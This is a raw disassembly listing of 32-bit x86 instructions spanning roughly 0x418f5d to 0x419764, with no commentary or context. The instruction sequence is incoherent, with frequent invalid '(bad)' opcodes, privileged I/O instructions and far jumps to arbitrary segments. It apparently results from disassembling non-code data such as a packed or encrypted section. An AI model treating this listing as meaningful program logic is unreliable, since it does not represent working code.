  418f5d:	cmp    dl,BYTE PTR [edx+0x343db26d]
  418f63:	rol    DWORD PTR [ebp+ebp*8+0x62c4bba9],cl
  418f6a:	std    
  418f6b:	fwait
  418f6c:	ret    
  418f6d:	jae    0x418f10
  418f6f:	push   0x24
  418f71:	sbb    DWORD PTR [ebx],eax
  418f73:	and    BYTE PTR [ebp-0x183a6265],cl
  418f79:	sub    ch,BYTE PTR [edi-0x79]
  418f7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f7d:	(bad)  
  418f7e:	sbb    BYTE PTR [esi-0x55],dh
  418f81:	jb     0x418f41
  418f83:	sti    
  418f84:	mov    al,ds:0xf5dbd029
  418f89:	into   
  418f8a:	sub    al,0xb2
  418f8c:	ret    
  418f8d:	dec    edi
  418f8e:	bound  eax,QWORD PTR [ebx+0x548a9763]
  418f94:	test   eax,0x9c57a169
  418f99:	jmp    0x1a1b53a8
  418f9e:	pop    ebp
  418f9f:	dec    ebx
  418fa0:	pop    esi
  418fa1:	xchg   esi,eax
  418fa2:	rcl    esp,cl
  418fa4:	imul   BYTE PTR [edi]
  418fa6:	(bad)  
  418fa7:	repz mov ebx,0xc64820bb
  418fad:	std    
  418fae:	jg     0x418fd7
  418fb0:	popa   
  418fb1:	xchg   WORD PTR [ebp+0x56af1845],si
  418fb8:	idiv   DWORD PTR ds:0xd0040cba
  418fbe:	xchg   DWORD PTR [edi+0x61d71ed2],esi
  418fc4:	aad    0x44
  418fc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418fc7:	lds    edi,FWORD PTR [edx]
  418fc9:	pop    esi
  418fca:	inc    eax
  418fcb:	add    dh,BYTE PTR [ecx*1-0xb5fa361]
  418fd2:	pusha  
  418fd3:	inc    ecx
  418fd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418fd5:	das    
  418fd6:	addr16 push ecx
  418fd8:	add    DWORD PTR ds:0x21543c7c,0x452df387
  418fe2:	stos   BYTE PTR es:[edi],al
  418fe3:	push   ebx
  418fe4:	inc    ecx
  418fe5:	mov    ebx,0x13896985
  418fea:	imul   ebx,edi,0x3f
  418fed:	loope  0x41903c
  418fef:	adc    BYTE PTR [ebx],dl
  418ff1:	dec    ecx
  418ff2:	ss loope 0x418fa0
  418ff5:	inc    edi
  418ff6:	mov    ch,0x14
  418ff8:	cli    
  418ff9:	mov    ebx,0xd18c72bd
  418ffe:	dec    ebx
  418fff:	jle    0x419050
  419001:	retfw  
  419003:	push   ebx
  419004:	add    bh,BYTE PTR [bx+si+0x4a]
  419008:	xlat   BYTE PTR ds:[ebx]
  419009:	test   DWORD PTR [esi-0x6c],edx
  41900c:	(bad)  
  41900d:	ret    
  41900e:	aam    0x2
  419010:	out    0xb2,al
  419012:	bound  ebp,QWORD PTR [edi-0x8]
  419015:	mov    edi,0x89003103
  41901a:	sub    eax,0xd82bf4e4
  41901f:	xor    esp,edx
  419021:	scas   eax,DWORD PTR es:[edi]
  419022:	leave  
  419023:	call   0xd4a3fa07
  419028:	ret    0xc0d5
  41902b:	retf   
  41902c:	clc    
  41902d:	fwait
  41902e:	pusha  
  41902f:	retf   0xd6ea
  419032:	sub    al,0xef
  419034:	shl    DWORD PTR [edi],cl
  419036:	sbb    BYTE PTR [edx],bh
  419038:	daa    
  419039:	sbb    eax,0xd01f556e
  41903e:	pop    es
  41903f:	push   eax
  419040:	mov    ds:0x42819c52,eax
  419045:	sbb    ecx,DWORD PTR [ebp-0x532f8baf]
  41904b:	dec    edi
  41904c:	and    al,0x5c
  41904e:	mov    ecx,0xf7184a1
  419053:	in     al,0xc9
  419055:	ins    BYTE PTR es:[edi],dx
  419056:	jmp    0x419055
  419058:	inc    ebp
  419059:	xchg   edx,eax
  41905a:	dec    edx
  41905b:	int    0xc4
  41905d:	enter  0xcf02,0x3f
  419061:	cwde   
  419062:	mov    ah,0xc
  419064:	mov    bh,0x72
  419066:	ja     0x4190d2
  419068:	loop   0x41907b
  41906a:	sbb    ebx,DWORD PTR [ebp-0x47]
  41906d:	jmp    0x419018
  41906f:	mov    WORD PTR [ebp+0x50],gs
  419072:	nop
  419073:	mov    edx,0x34d8753
  419078:	adc    DWORD PTR [eax],ebx
  41907a:	je     0x41903e
  41907c:	jne    0x419079
  41907e:	sbb    DWORD PTR [edx],0xffffffdf
  419081:	int3   
  419082:	push   0xd7b712ac
  419087:	(bad)  
  419088:	jns    0x419029
  41908a:	outs   dx,DWORD PTR ds:[esi]
  41908b:	adc    esi,edi
  41908d:	stos   DWORD PTR es:[edi],eax
  41908e:	xchg   esp,eax
  41908f:	or     DWORD PTR [esp+eax*1],0x25b095ed
  419096:	int3   
  419097:	and    DWORD PTR [eax-0x672d160b],esi
  41909d:	fdivr  QWORD PTR [esi]
  41909f:	xchg   ecx,eax
  4190a0:	mov    al,ds:0x8b6ea04a
  4190a5:	jbe    0x4190a1
  4190a7:	scas   al,BYTE PTR es:[edi]
  4190a8:	retf   
  4190a9:	jns    0x4190b4
  4190ab:	mov    ds:0x99bc0649,al
  4190b0:	inc    eax
  4190b1:	sbb    DWORD PTR [ebp+0x3f],0x46aedec
  4190b8:	lods   al,BYTE PTR ds:[esi]
  4190b9:	mov    edi,0xd34855fe
  4190be:	in     al,dx
  4190bf:	dec    edi
  4190c0:	test   edi,0xd4627e7
  4190c6:	push   ebp
  4190c7:	push   ebp
  4190c8:	push   esp
  4190c9:	push   ebp
  4190ca:	fcomp  QWORD PTR ds:0x500f2450
  4190d0:	imul   ebx,DWORD PTR [ebp-0x36],0x4b
  4190d4:	fmul   DWORD PTR [edi+0x56]
  4190d7:	sub    BYTE PTR [ebp+0x49],bl
  4190da:	pop    eax
  4190db:	xor    eax,0x7ffb9293
  4190e0:	push   ebp
  4190e1:	adc    eax,0x6c44d7d8
  4190e6:	(bad)  
  4190e7:	and    DWORD PTR ds:0xd522d093,esp
  4190ed:	ins    DWORD PTR es:[edi],dx
  4190ee:	test   DWORD PTR [edx+0x11],edx
  4190f1:	jnp    0x41911e
  4190f3:	xor    eax,0x32d19403
  4190f8:	sbb    al,0x2e
  4190fa:	mov    DWORD PTR [esi-0x2e],esi
  4190fd:	mov    edi,0x33e18801
  419102:	xchg   esi,eax
  419103:	jle    0x419131
  419105:	clc    
  419106:	(bad)  
  419108:	xor    DWORD PTR [esi],0x55136958
  41910e:	in     eax,0x99
  419110:	push   ss
  419111:	retf   
  419112:	clc    
  419113:	punpckhwd mm5,QWORD PTR [ecx]
  419116:	ss dec eax
  419118:	pop    ecx
  419119:	push   edi
  41911a:	push   edx
  41911b:	inc    ebx
  41911c:	jmp    0x41913b
  41911e:	loopne 0x4190f1
  419120:	cdq    
  419121:	xchg   esp,eax
  419122:	test   DWORD PTR [ecx],ebp
  419124:	je     0x41913f
  419126:	shl    BYTE PTR [ecx+0x7a2999f7],1
  41912c:	mov    al,ds:0x581a2c9f
  419131:	or     BYTE PTR [esi+0x40],bl
  419134:	(bad)  
  419135:	cmp    al,0x6e
  419137:	jmp    0xca81:0x23a102af
  41913e:	outs   dx,BYTE PTR ds:[esi]
  41913f:	cmc    
  419140:	call   0x83f97163
  419145:	xchg   esp,eax
  419146:	cdq    
  419147:	xor    BYTE PTR [edi+eax*1+0x6655ae],ch
  41914e:	add    DWORD PTR [ebp-0x758e443d],edx
  419154:	push   ss
  419155:	lea    edx,[esi-0x5c9e450d]
  41915b:	pop    ebx
  41915c:	popa   
  41915d:	(bad)  
  41915e:	push   eax
  41915f:	xchg   edx,eax
  419160:	cmp    edx,0xffffffac
  419163:	mov    al,0xda
  419165:	test   BYTE PTR [ecx+0x102b535b],al
  41916b:	pop    ebx
  41916c:	sbb    esp,DWORD PTR es:[edx]
  41916f:	add    al,BYTE PTR ds:0xaf3e8b6f
  419175:	jp     0x41919c
  419177:	xchg   ebx,eax
  419178:	dec    eax
  419179:	cwde   
  41917a:	sbb    al,0xd5
  41917c:	lock retf 
  41917e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41917f:	hlt    
  419180:	pop    ss
  419181:	in     al,0x34
  419183:	test   al,0xb8
  419185:	lahf   
  419186:	mov    ds:0x45f3322f,al
  41918b:	xchg   BYTE PTR [ecx+eiz*2-0x8e95d59],dh
  419192:	pushf  
  419193:	pop    esi
  419194:	push   edx
  419195:	xchg   edi,eax
  419196:	dec    esp
  419197:	xor    edi,esi
  419199:	icebp  
  41919a:	xor    al,0xa5
  41919c:	mov    esi,0x8ff383d
  4191a1:	aad    0x74
  4191a3:	pop    ebx
  4191a4:	cmp    edi,esi
  4191a6:	pop    ds
  4191a7:	sbb    DWORD PTR [esi-0x54],esi
  4191aa:	es mov edx,0xc73644d3
  4191b0:	and    bl,BYTE PTR ds:0x328ae7c8
  4191b7:	sub    al,BYTE PTR [esi-0x4e]
  4191ba:	fmul   QWORD PTR [edi-0x32]
  4191bd:	int    0x88
  4191bf:	pop    ss
  4191c0:	shl    DWORD PTR [edi],0x80
  4191c3:	add    DWORD PTR [ebp-0x1380fab2],ecx
  4191c9:	enter  0x5dbc,0x2f
  4191cd:	gs xchg esp,eax
  4191cf:	fbstp  TBYTE PTR [esp+eax*2-0xb21c723]
  4191d6:	jo     0x419229
  4191d8:	(bad)  
  4191da:	mov    ds:0x657fd646,al
  4191df:	pop    ebx
  4191e0:	inc    ebp
  4191e1:	lds    esp,FWORD PTR [ebx+0x1079af8d]
  4191e7:	mov    esi,0x898a956e
  4191ec:	out    0xe1,al
  4191ee:	pushf  
  4191ef:	or     DWORD PTR [edi+0x7f65ff38],esi
  4191f5:	inc    eax
  4191f6:	sub    eax,esi
  4191f8:	cmp    BYTE PTR ds:0xdd1065d5,0x11
  4191ff:	shl    esp,cl
  419201:	fist   WORD PTR [edi+0x11]
  419204:	mov    eax,ds:0x322acfcc
  419209:	mov    edi,0xa7979026
  41920e:	sbb    BYTE PTR [ebx],0x2c
  419211:	mov    ds:0xab351fdd,eax
  419216:	stos   DWORD PTR es:[edi],eax
  419217:	ret    
  419218:	pop    esp
  419219:	call   0x6611:0x440d292f
  419220:	inc    ecx
  419221:	mov    ebp,0xa1165d17
  419226:	jg     0x4191b8
  419228:	push   eax
  419229:	jp     0x4191be
  41922b:	mov    al,ds:0xfb4d8b1e
  419230:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419231:	test   eax,0xba2b5e88
  419236:	das    
  419237:	push   es
  419238:	dec    ecx
  419239:	inc    dl
  41923b:	nop
  41923c:	xchg   edi,eax
  41923d:	scas   al,BYTE PTR es:[edi]
  41923e:	sub    DWORD PTR [ecx+edx*8],eax
  419241:	(bad)  
  419243:	inc    edx
  419244:	cs inc edi
  419246:	leave  
  419247:	aam    0xc6
  419249:	inc    ecx
  41924a:	xor    al,ch
  41924c:	in     eax,0x8b
  41924e:	xor    eax,0x19175b33
  419253:	mov    al,ds:0x6205f0f3
  419258:	jb     0x419296
  41925a:	jmp    0x7ff7:0x520efdf2
  419261:	test   eax,0x51cfdf06
  419266:	pop    esp
  419267:	das    
  419268:	pop    ds
  419269:	popf   
  41926a:	ror    DWORD PTR [edx-0x50],1
  41926d:	or     cl,BYTE PTR [edi-0x5bfe87f3]
  419273:	mov    edx,0xd6eab4d2
  419278:	jge    0x419267
  41927a:	dec    ebx
  41927b:	fsub   DWORD PTR ds:0xb041ccdd
  419281:	add    BYTE PTR [eax*8+0xa7cb961],0xb0
  419289:	pop    ds
  41928a:	xchg   edx,eax
  41928b:	add    al,0x2
  41928d:	es retf 
  41928f:	int3   
  419290:	mov    BYTE PTR [edi+0x40779a51],0x50
  419297:	add    ah,BYTE PTR [eax]
  419299:	ja     0x4192d9
  41929b:	loopne 0x4192bd
  41929d:	inc    ecx
  41929e:	pop    eax
  41929f:	ds in  al,0xbe
  4192a2:	stc    
  4192a3:	xchg   dh,dl
  4192a5:	mov    cl,0x4a
  4192a7:	adc    DWORD PTR [edx+edx*4+0xfc76c75],edx
  4192ae:	jmp    FWORD PTR [edi+0x3c]
  4192b1:	fcomp  DWORD PTR [edx-0x54]
  4192b4:	sbb    ebp,DWORD PTR [esi+0x7ffc94b8]
  4192ba:	imul   ebx,DWORD PTR [eax],0xffffffff
  4192bd:	xor    BYTE PTR [edx+0x1e66e4e4],dh
  4192c3:	mov    ebp,DWORD PTR [edi-0x14399308]
  4192c9:	movzx  edx,BYTE PTR [eax-0x15023990]
  4192d0:	mov    DWORD PTR [ebx],ecx
  4192d2:	inc    esi
  4192d3:	fiadd  DWORD PTR [edi-0x42]
  4192d6:	cdq    
  4192d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4192d8:	xchg   edi,eax
  4192d9:	sti    
  4192da:	pusha  
  4192db:	mov    bl,0xf6
  4192dd:	daa    
  4192de:	sub    edi,DWORD PTR [ebx]
  4192e0:	jo     0x4192ab
  4192e2:	test   eax,0x5603ce7f
  4192e7:	inc    eax
  4192e8:	xlat   BYTE PTR ds:[ebx]
  4192e9:	daa    
  4192ea:	xchg   cl,dl
  4192ec:	out    0x1f,eax
  4192ee:	jmp    0x41936f
  4192f0:	adc    al,0xd0
  4192f2:	xor    bh,bh
  4192f4:	cmp    cl,BYTE PTR ds:0x7db3
  4192f9:	out    dx,al
  4192fa:	mov    eax,0xe1e24e0d
  4192ff:	in     al,dx
  419300:	leave  
  419301:	rcr    DWORD PTR [ebx],0x22
  419304:	xor    BYTE PTR [eax+0x5db5129c],ah
  41930a:	push   esp
  41930b:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41930d:	push   es
  41930e:	cmp    edi,DWORD PTR [ebp+0x918d578]
  419314:	cdq    
  419315:	xor    al,0x91
  419317:	(bad)  
  419318:	push   esi
  419319:	(bad)  
  41931a:	and    ah,BYTE PTR ds:0x68876ed8
  419320:	adc    esp,DWORD PTR [edi]
  419322:	ins    DWORD PTR es:[edi],dx
  419323:	fstp   QWORD PTR [edi+0x7d]
  419326:	xor    DWORD PTR [eax+0x3f0eb52b],ebp
  41932c:	add    al,dh
  41932e:	(bad)  
  41932f:	fidiv  WORD PTR [esi+edi*1+0x7c]
  419333:	call   0x1f7bb8c0
  419338:	dec    ebx
  419339:	jae    0x41934f
  41933b:	ficom  WORD PTR ds:0xb12ca01d
  419341:	xchg   ebx,eax
  419342:	test   DWORD PTR [ecx],eax
  419344:	ficom  DWORD PTR ds:0x56b2bdf1
  41934a:	popf   
  41934b:	(bad)  
  41934c:	pop    esp
  41934d:	popa   
  41934e:	xchg   edx,eax
  41934f:	repnz retf 
  419351:	xchg   ecx,eax
  419352:	adc    ch,cl
  419354:	or     eax,0xd8e55de0
  419359:	cmp    BYTE PTR [ecx+0xf],dh
  41935c:	sub    eax,0x46fe129c
  419361:	js     0x419359
  419363:	inc    esi
  419364:	add    DWORD PTR [ecx+eiz*2],eax
  419367:	mov    WORD PTR [edi+0x35de258a],?
  41936d:	cli    
  41936e:	push   es
  41936f:	add    esi,eax
  419371:	daa    
  419372:	pop    edx
  419373:	hlt    
  419374:	dec    esp
  419375:	mov    cl,0xfc
  419377:	mov    bl,BYTE PTR [ebp+ebp*2+0x39]
  41937b:	jmp    0x4193e1
  41937d:	xchg   esi,eax
  41937e:	or     ebx,DWORD PTR [edx+0x3d39caee]
  419384:	pop    edi
  419385:	fldenv [edi+ebx*8]
  419388:	mov    eax,ds:0xaf98687e
  41938d:	das    
  41938e:	cmc    
  41938f:	call   0x76b5:0xe972fb0c
  419396:	fld    QWORD PTR [ecx]
  419398:	std    
  419399:	jmp    0xae0aeaf7
  41939e:	loope  0x419402
  4193a0:	sahf   
  4193a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193a2:	inc    edi
  4193a3:	lods   al,BYTE PTR ds:[esi]
  4193a4:	enter  0x684e,0xa6
  4193a8:	call   0x6701f76
  4193ad:	test   ebp,ecx
  4193af:	out    dx,eax
  4193b0:	loope  0x419352
  4193b2:	jmp    0x8eb:0x29f53947
  4193b9:	xlat   BYTE PTR ds:[ebx]
  4193ba:	not    BYTE PTR ds:0x9cb87f8a
  4193c0:	out    0xd0,al
  4193c2:	cwde   
  4193c3:	inc    edi
  4193c4:	call   0x2e0c:0xaaef29e1
  4193cb:	jmp    0x8f1c:0x4df0ad96
  4193d2:	cld    
  4193d3:	mov    BYTE PTR [esi],al
  4193d5:	shl    DWORD PTR [ebx+eax*2-0x4c],0xac
  4193da:	mov    ch,0x7c
  4193dc:	arpl   cx,dx
  4193de:	fcomp  QWORD PTR [eax+0x61067259]
  4193e4:	adc    eax,0xc4d56e05
  4193e9:	dec    edi
  4193ea:	ror    DWORD PTR [edi-0x1d6ec9b3],cl
  4193f0:	test   DWORD PTR [edi-0x66],esp
  4193f3:	or     BYTE PTR [eax],ah
  4193f5:	lods   al,BYTE PTR ds:[esi]
  4193f6:	fstp   DWORD PTR [edx]
  4193f8:	add    BYTE PTR [edi-0x30],al
  4193fb:	ds int 0xef
  4193fe:	cmp    edi,DWORD PTR [ebx-0x66]
  419401:	ficomp DWORD PTR [edi]
  419403:	aad    0x66
  419405:	xor    ch,bl
  419407:	cmp    DWORD PTR [eax-0x11e118d5],eax
  41940d:	aas    
  41940e:	jbe    0x419439
  419410:	out    0xf9,al
  419412:	lahf   
  419413:	mov    ecx,0x9d0774da
  419418:	mov    WORD PTR ds:[ecx+0x36],gs
  41941c:	xor    ebx,edi
  41941e:	adc    ebx,ebp
  419420:	or     DWORD PTR [esi+eiz*2+0x40a8430a],ebx
  419427:	mov    bh,0xd4
  419429:	stos   BYTE PTR es:[edi],al
  41942a:	out    0x9c,eax
  41942c:	dec    esi
  41942d:	stc    
  41942e:	xchg   esp,eax
  41942f:	ss xor esp,ebx
  419432:	fwait
  419433:	clc    
  419434:	dec    ebp
  419435:	cld    
  419436:	pusha  
  419437:	addr16 jge 0x419470
  41943a:	or     ah,BYTE PTR [ecx+0x6df68b07]
  419440:	cmp    eax,0x94b5f6f8
  419445:	mov    al,0xb1
  419447:	xchg   ebp,eax
  419448:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419449:	mov    WORD PTR [ebx+0x55],gs
  41944c:	dec    edi
  41944d:	rcr    DWORD PTR [ecx-0x9],cl
  419450:	xor    BYTE PTR [edi+0x2009bc13],dl
  419456:	bound  esi,QWORD PTR [ebp-0x40e207cc]
  41945c:	outs   dx,DWORD PTR ds:[esi]
  41945d:	arpl   WORD PTR [edi+0x28],cx
  419460:	pop    es
  419461:	mov    eax,0x831a39c0
  419466:	cs mov dl,0x5e
  419469:	stos   BYTE PTR es:[edi],al
  41946a:	cmc    
  41946b:	in     eax,0x7d
  41946d:	mov    cl,0xa0
  41946f:	int3   
  419470:	xchg   ecx,eax
  419471:	sub    DWORD PTR [eax+eiz*4],ebp
  419474:	jecxz  0x4194ad
  419476:	popa   
  419477:	and    BYTE PTR [ebx-0x5985d32f],ah
  41947d:	adc    al,0x44
  41947f:	and    ah,BYTE PTR [ecx]
  419481:	xlat   BYTE PTR ds:[ebx]
  419482:	cmc    
  419483:	pop    esp
  419485:	or     ch,ah
  419487:	in     al,0xe3
  419489:	rcl    ch,1
  41948b:	push   esp
  41948c:	lds    edx,FWORD PTR [ebx+ebx*1+0x15]
  419490:	push   esp
  419491:	test   BYTE PTR [esi+0x54],dl
  419494:	rcr    BYTE PTR [ebx+edi*4+0x3b],1
  419498:	mov    edx,0xf1471bbb
  41949d:	rol    BYTE PTR [esp+ebx*2-0x18],0x35
  4194a2:	dec    eax
  4194a3:	pop    ebx
  4194a4:	outs   dx,DWORD PTR ds:[esi]
  4194a5:	jmp    0xa9f3:0x59578bc8
  4194ac:	adc    BYTE PTR [edx+edi*4+0x1e5ef89b],ah
  4194b3:	cmp    DWORD PTR [ebx+esi*2],edi
  4194b6:	jg     0x4194d1
  4194b8:	add    edi,DWORD PTR [ebx-0x631fea2f]
  4194be:	leave  
  4194bf:	mov    bh,0x10
  4194c1:	sbb    dh,BYTE PTR [eax+0x3349d10c]
  4194c7:	or     al,0x16
  4194c9:	mov    edi,0xf539d677
  4194ce:	jo     0x4194f4
  4194d0:	jp     0x4194b8
  4194d2:	retf   0x22ea
  4194d5:	int    0x51
  4194d7:	jnp    0x41950d
  4194d9:	inc    esp
  4194da:	jecxz  0x4194a1
  4194dc:	jl     0x4194f1
  4194de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194df:	or     eax,0x8c76b46d
  4194e4:	mov    ebp,0xfe937b5c
  4194e9:	outs   dx,BYTE PTR ds:[esi]
  4194ea:	xchg   ebx,eax
  4194eb:	xchg   ecx,eax
  4194ec:	(bad)  
  4194ed:	mov    ebx,0x3de34068
  4194f2:	push   ds
  4194f3:	and    DWORD PTR [edi-0x3d362ee4],ebp
  4194f9:	das    
  4194fa:	or     ah,BYTE PTR [edx+0x23]
  4194fd:	out    dx,al
  4194fe:	mov    cl,0x25
  419500:	adc    bh,0x4c
  419503:	stc    
  419504:	inc    edx
  419505:	loopne 0x419580
  419507:	push   0xffffffe1
  419509:	daa    
  41950a:	jp     0x41954d
  41950c:	js     0x419570
  41950e:	pop    edx
  41950f:	pop    es
  419510:	dec    esp
  419511:	das    
  419512:	sbb    eax,0x45b8b63b
  419517:	sbb    BYTE PTR [esi],dl
  419519:	repz mov eax,0x23fbb11f
  41951f:	inc    esi
  419520:	dec    esp
  419521:	loopne 0x4194b3
  419523:	imul   edx,DWORD PTR [eax],0x4a
  419526:	inc    ecx
  419527:	das    
  419528:	les    ebp,FWORD PTR [edi]
  41952a:	xor    DWORD PTR [edx-0x18c1151b],esi
  419530:	mov    dh,0x2b
  419532:	pop    ebp
  419533:	fstp   TBYTE PTR [eax]
  419535:	cmp    eax,0x58d3508
  41953a:	test   DWORD PTR [edi],ebx
  41953c:	inc    edx
  41953d:	ja     0x419528
  41953f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419540:	outs   dx,DWORD PTR ds:[esi]
  419541:	xchg   ebx,eax
  419542:	jmp    0x749290fb
  419547:	mov    cl,0x14
  419549:	xlat   BYTE PTR ds:[ebx]
  41954a:	icebp  
  41954b:	pop    ss
  41954c:	mov    bl,0x17
  41954e:	mov    al,0x8f
  419550:	ins    DWORD PTR es:[edi],dx
  419551:	dec    esi
  419552:	xlat   BYTE PTR ds:[ebx]
  419553:	aad    0x2b
  419555:	xor    ecx,DWORD PTR [eax-0x175fab96]
  41955b:	fisttp QWORD PTR fs:[ebx+eax*2-0x1dfa86c]
  419563:	or     al,dh
  419565:	cmp    BYTE PTR [edi+0x671d5260],ch
  41956b:	stos   DWORD PTR es:[edi],eax
  41956c:	push   edi
  41956d:	ja     0x419514
  41956f:	jae    0x419505
  419571:	push   ebp
  419572:	in     eax,dx
  419573:	jle    0x41953d
  419575:	inc    ebp
  419576:	jmp    0xb97045a6
  41957b:	dec    eax
  41957c:	dec    edx
  41957d:	ins    DWORD PTR es:[edi],dx
  41957e:	retf   
  41957f:	repnz bound ecx,QWORD PTR [ebp+0x69]
  419583:	sbb    edi,DWORD PTR [eax+0x4]
  419586:	jmp    0x419558
  419588:	sbb    bh,BYTE PTR [edi]
  41958a:	into   
  41958b:	outs   dx,DWORD PTR ds:[esi]
  41958c:	iret   
  41958d:	vpsubq ymm2,ymm4,YMMWORD PTR [edx-0x3e9e1f13]
  419595:	int3   
  419596:	mov    ds:0xb2ff2b20,eax
  41959b:	jno    0x419533
  41959d:	iret   
  41959e:	push   esp
  41959f:	or     DWORD PTR [ebx*2+0x2778f75c],esp
  4195a6:	popa   
  4195a7:	mov    ds:0x25e57c6c,al
  4195ac:	jb     0x41959c
  4195ae:	es cs xchg ecx,eax
  4195b1:	cli    
  4195b2:	or     DWORD PTR [edx-0x7d],0x4916da59
  4195b9:	je     0x41956d
  4195bb:	mov    esp,0xcb84287c
  4195c0:	xor    cl,BYTE PTR [edx+edi*4]
  4195c3:	sub    DWORD PTR [eax+0x11],edi
  4195c6:	rol    DWORD PTR [esi],0x10
  4195c9:	jg     0x4195d8
  4195cb:	sbb    al,0x70
  4195cd:	add    al,0xaa
  4195cf:	test   BYTE PTR [edx-0x40775792],dl
  4195d5:	or     al,0xe7
  4195d7:	jmp    0x419573
  4195d9:	stc    
  4195da:	clc    
  4195db:	arpl   WORD PTR [edx-0x3c609855],si
  4195e1:	scas   eax,DWORD PTR es:[edi]
  4195e2:	mov    ecx,0xe3520ce0
  4195e7:	xchg   ebp,eax
  4195e8:	fcmovbe st,st(1)
  4195ea:	jns    0x419618
  4195ec:	mov    eax,ds:0x18a6ad4
  4195f1:	pop    edx
  4195f2:	sbb    ch,BYTE PTR [eax+edi*8]
  4195f5:	rcl    BYTE PTR [edx+0x4dc14d24],0xe6
  4195fc:	lock inc DWORD PTR [esi+0x4]
  419600:	sub    al,BYTE PTR [ebx-0x316e59de]
  419606:	(bad)  
  419607:	out    dx,al
  419608:	push   0x3e
  41960a:	fs inc eax
  41960c:	xor    BYTE PTR [ebp+0x32078c04],cl
  419612:	out    0x32,eax
  419614:	inc    esp
  419615:	jbe    0x41968d
  419617:	adc    BYTE PTR [eax+0x49],dl
  41961a:	pop    ebp
  41961b:	ins    DWORD PTR es:[edi],dx
  41961c:	add    BYTE PTR [ebx+0x11e96f27],dh
  419622:	mov    dh,0x40
  419624:	call   0xbe4f:0x48553e16
  41962b:	xor    BYTE PTR [edx+eiz*1+0x4e],0x6a
  419630:	fidivr WORD PTR [ecx]
  419632:	sti    
  419633:	push   eax
  419634:	jecxz  0x419600
  419636:	pop    es
  419637:	pop    esi
  419638:	dec    edx
  419639:	call   0x3372:0x27b5c0f4
  419640:	dec    eax
  419641:	push   ebx
  419642:	jae    0x419602
  419644:	jne    0x419670
  419646:	aas    
  419647:	sub    eax,0xc986a6c4
  41964c:	test   al,0x88
  41964e:	push   esp
  41964f:	xor    al,0x21
  419651:	mov    ds:0x16422b27,eax
  419656:	stos   DWORD PTR es:[edi],eax
  419657:	cmp    ecx,DWORD PTR [edx+0x677ef287]
  41965d:	dec    eax
  41965e:	sub    al,0xbf
  419660:	inc    edx
  419661:	out    0x14,eax
  419663:	jno    0x419601
  419665:	cmp    eax,0xc988c2af
  41966a:	xor    DWORD PTR [ebp+ebp*8+0x10],0xfbf9c0b1
  419672:	inc    edx
  419673:	jns    0x4196b0
  419675:	imul   ecx,DWORD PTR [esi],0x34d8aeed
  41967b:	push   edi
  41967c:	lods   al,BYTE PTR ds:[esi]
  41967d:	sub    DWORD PTR [ebx],edi
  41967f:	mov    ch,0x4
  419681:	sbb    BYTE PTR [ecx+ebx*4],al
  419684:	push   ds
  419685:	div    BYTE PTR [ebp-0x7d]
  419688:	fistp  WORD PTR [edx]
  41968a:	dec    esp
  41968b:	push   eax
  41968c:	or     al,0x58
  41968e:	xchg   ebx,eax
  41968f:	push   0xe
  419691:	sbb    WORD PTR [ebx],0xef42
  419696:	pop    edx
  419697:	and    eax,0x4eb739fa
  41969c:	mov    edi,0x6e713e6a
  4196a1:	cmp    DWORD PTR [edx-0x55464471],edi
  4196a7:	lds    esp,FWORD PTR [edi-0x6]
  4196aa:	shl    DWORD PTR [edi-0x5c14eaeb],0x21
  4196b1:	cmp    al,BYTE PTR [ecx]
  4196b3:	sti    
  4196b4:	cmp    DWORD PTR [ecx+edi*2-0x4],ecx
  4196b8:	mov    ah,0x8a
  4196ba:	int3   
  4196bb:	repz aas 
  4196bd:	push   es
  4196be:	mov    dh,0x7b
  4196c0:	mov    al,0x2d
  4196c2:	jb     0x41964f
  4196c4:	add    edi,DWORD PTR [ebx+ecx*2+0xbd88488]
  4196cb:	repnz repnz sar DWORD PTR [ebx+0x5a1ecd5b],0x4d
  4196d4:	fs call 0x1b2b84bf
  4196da:	dec    ecx
  4196db:	int    0xf2
  4196dd:	fcom   QWORD PTR [ecx-0xd]
  4196e0:	jns    0x4196dc
  4196e2:	jno    0x4196e2
  4196e4:	push   ebx
  4196e5:	cmp    edx,eax
  4196e7:	adc    edx,ecx
  4196e9:	mov    ebp,0x44957653
  4196ee:	shl    DWORD PTR [edi],0xe1
  4196f1:	or     al,0xc4
  4196f3:	rol    DWORD PTR [eax+0x32],1
  4196f6:	mov    al,ds:0xe7dcde50
  4196fb:	fwait
  4196fc:	push   edx
  4196fd:	fisubr WORD PTR [edx]
  4196ff:	popa   
  419700:	mov    dl,0x65
  419702:	sub    ebx,ebp
  419704:	pop    edi
  419705:	pushf  
  419706:	inc    ebx
  419707:	test   al,0xd0
  419709:	pop    eax
  41970a:	inc    ebp
  41970b:	stos   BYTE PTR es:[edi],al
  41970c:	test   ah,cl
  41970e:	mov    ds,WORD PTR [ebp+0x1b]
  419711:	cmp    al,0x49
  419713:	sub    DWORD PTR [eax+0x77d37d71],ecx
  419719:	and    esp,DWORD PTR [esi-0x3566fb27]
  41971f:	push   cs
  419720:	jle    0x4197a0
  419722:	aad    0x36
  419724:	lock xchg edx,eax
  419726:	lods   eax,DWORD PTR ds:[esi]
  419727:	jns    0x41973e
  419729:	xchg   ebx,eax
  41972a:	mov    BYTE PTR [edi-0xe],0xac
  41972e:	fdivrp st(5),st
  419730:	or     eax,0x36f14d6a
  419735:	xor    DWORD PTR [ebp+esi*1+0x36],eax
  419739:	dec    esi
  41973a:	je     0x41977f
  41973c:	pop    es
  41973d:	cmp    eax,0xfb46447f
  419742:	imul   eax,DWORD PTR [ebp-0x6fd51da0],0xb14afb71
  41974c:	mov    DWORD PTR [edi+0xfdaa41e],eax
  419752:	stos   BYTE PTR es:[edi],al
  419753:	repnz call 0x69:0xe3c9d86e
  41975b:	cmp    ah,BYTE PTR [edx+0x7]
  41975e:	leave  
  41975f:	adc    BYTE PTR [ecx-0x29],dh
  419762:	repnz out dx,al
  419764:	sub    al,0xfb
